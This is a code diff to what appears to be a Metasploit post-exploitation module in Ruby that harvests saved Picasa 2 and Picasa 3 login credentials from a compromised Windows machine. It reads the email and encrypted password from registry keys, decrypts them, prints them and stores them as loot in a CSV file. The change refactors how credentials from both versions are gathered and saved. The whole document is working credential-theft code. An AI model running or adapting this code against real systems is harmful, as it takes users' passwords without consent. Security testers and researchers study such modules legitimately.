@@ -70,32 +70,13 @@ class Metasploit3 < Msf::Post
 	end
 
 	def get_registry
-	psecrets = ""
-
+	
 		begin
 			print_status("Looking in registry for stored login passwords by Picasa ...")
 
 			username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\",
 			'GaiaEmail')
 			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\",
-			'GaiaPass')
-
-			if username != nil and password != nil
-				passbin = [password].pack("H*")
-				pass = decrypt_password(passbin)
-
-				if pass != nil
-					print_status("Username: #{username}")
-					print_status("Password: #{pass}")
-					secret = "#{username}:#{pass}"
-					psecrets << secret
-				end
-			end
-
-			#For early versions of Picasa3
-			username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\",
-			'GaiaEmail')
-			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\",
 			'GaiaPass')
 
 			credentials = Rex::Ui::Text::Table.new(
@@ -106,27 +87,56 @@ class Metasploit3 < Msf::Post
 						"User",
 						"Password"
 					])
+			
+			
+			foundcreds = 0
+			if username != nil and password != nil				
+				passbin = [password].pack("H*")
+				pass = decrypt_password(passbin)
+
+				if pass != nil
+					print_status("Found Picasa 2 credentials.")
+					print_good("Username: #{username}\t Password: #{pass}")				
+					
+					foundcreds = 1
+					credentials << [username,pass]
+
+				end
+			end
+
+			#For early versions of Picasa3
+			username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\",
+			'GaiaEmail')
+			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\",
+			'GaiaPass')
+
 
 			if username != nil and password != nil
 				passbin = [password].pack("H*")
 				pass = decrypt_password(passbin)
 
 				if pass != nil
-					print_status("Username: #{username}")
-					print_status("Password: #{pass}")
+					print_status("Found Picasa 3 credentials.")
+					print_good("Username: #{username}\t Password: #{pass}")					
 
+					foundcreds = 1
 					credentials << [username,pass]
-					path = store_loot(
-					"picasa.creds",
-					"text/csv",
-					session,
-					credentials.to_csv,
-					"decrypted_picasa_data.csv",
-					"Decrypted Picasa Passwords")
-
-					print_status("Decrypted passwords saved in: #{path}")
 				end
 			end
+		
+		if foundcreds == 1
+			path = store_loot(
+			"picasa.creds",
+			"text/csv",
+			session,
+			credentials.to_csv,
+			"decrypted_picasa_data.csv",
+			"Decrypted Picasa Passwords")
+
+			print_status("Decrypted passwords saved in: #{path}")
+		else 
+			print_status("No Picasa credentials found.")
+		end
 
 		rescue ::Exception => e
 				print_error("An error has occurred: #{e.to_s}")
